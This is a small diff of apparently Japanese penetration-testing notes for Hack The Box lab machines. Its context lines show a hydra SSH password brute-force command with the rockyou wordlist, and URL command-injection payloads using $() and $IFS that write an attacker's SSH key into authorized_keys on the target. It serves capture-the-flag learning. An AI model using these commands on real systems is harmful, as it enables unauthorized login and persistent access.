@@ -354,13 +354,10 @@ ffuf -c -w /usr/share/dnsrecon/subdomains-top1mil-5000.txt -u http://schooled.ht
 ユーザーが分かっていた時
 
 ```
-
 hydra -l kyle -P ~/rockyou.txt ssh://writer.htb -VV -f -t 60
 
 -t: 並列で実行するtask数 (defualt 16)
-
 -f: login/pass pair が見つかったら終了
-
 -VV: show login/pass for each attempt
 
 ```
@@ -369,6 +366,7 @@ hydra -l kyle -P ~/rockyou.txt ssh://writer.htb -VV -f -t 60
 ### 進入先に公開鍵を、RCEで作成する
 
 [SSH基礎記事](https://qiita.com/tag1216/items/5d06bad7468f731f590e)
+
 [Writeup](https://0xdf.gitlab.io/2021/02/06/htb-doctor.html#beyond-root)
 
 
@@ -380,8 +378,6 @@ http://10.10.14.6/$(mkdir$IFS'/home/web/.ssh')
 id_ed255519.pubの中身をコピー
 http://10.10.14.6/$(echo$IFS'ssh-ed25519'$IFS'AAAAC3NzaC1lZDI1NTE5AAAAIOztJ2PDjV2sPrb96JZ1JVCS36aYTqzD/BR2T89y7QyB'>'/home/web/.ssh/authorized_keys')
 ssh -i ./id_ed255919 web@doctor.htb
-
-
 ```
 
 ### SCP
